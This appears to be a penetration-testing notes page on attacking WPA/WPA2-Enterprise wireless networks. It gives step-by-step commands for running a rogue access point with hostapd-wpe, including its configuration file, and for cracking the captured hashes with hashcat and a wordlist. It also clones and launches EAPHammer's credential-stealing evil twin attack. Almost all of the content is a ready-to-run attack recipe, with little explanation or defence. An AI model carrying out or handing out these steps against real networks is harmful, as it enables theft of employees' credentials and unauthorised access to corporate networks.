# Enterprise

### hostapd-wpe

1\. Install the required dependencies:

```bash
sudo apt install hostapd-wpe libnl-3-dev libssl-dev
```

2\. Modify the `hostapd-wpe.conf` file, ensuring to modify the `ssid` variable:

```bash
nano /etc/hostapd-wpe/hostapd-wpe.conf

#
# hostapd-wpe.conf
# Brad Antoniewicz (@brad_anton) - Foundstone
# ------------------------------------------------
#
# Configuration file for hostapd-wpe
# 
# General Options - Likely to need to be changed if you're using this
# Interface - Probably wlan0 for 802.11, eth0 for wired
interface=wlan0
# Driver - comment this out if 802.11
#driver=wired
# May have to change these depending on build location
eap_user_file=hostapd-wpe.eap_user
ca_cert=../../hostapd-wpe/certs/ca.pem
server_cert=../../hostapd-wpe/certs/server.pem
private_key=../../hostapd-wpe/certs/server.pem
private_key_passwd=whatever
dh_file=../../hostapd-wpe/certs/dh
# 802.11 Options - Uncomment all if 802.11
ssid=hostapd-wpe
hw_mode=g
channel=1
```

3\. Kill problematic processes such as `wpa_supplicant` which may interfere with our  access point:

```bash
sudo airmon-ng check
```

4\. We can then run our malicious access point and wait for connections:

```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

5\. Upon receiving a connection we can attempt to crack the hash provided using Hashcat:

```bash
hashcat -m 5500 00 -a 0 /usr/share/wordlists/rockyou.txt
```

### EAPHammer

{% embed url="https://github.com/s0lst1c3/eaphammer" %}

1\. Clone `eaphammer` from the official repository:

```bash
git clone https://github.com/s0lst1c3/eaphammer.git
```

2\. Run the `kali-setup` script:

```bash
./kali-setup
```

3\. Finally, setup and execute the credential stealing evil twin attack against a WPA/2-EAP network:

```bash
# generate the certificate
./eaphammer --cert-wizard

# launch the attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid MaliciousAP --creds
```

### References

{% embed url="https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html" %}

{% embed url="https://adam-toscher.medium.com/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2" %}

{% embed url="https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html" %}
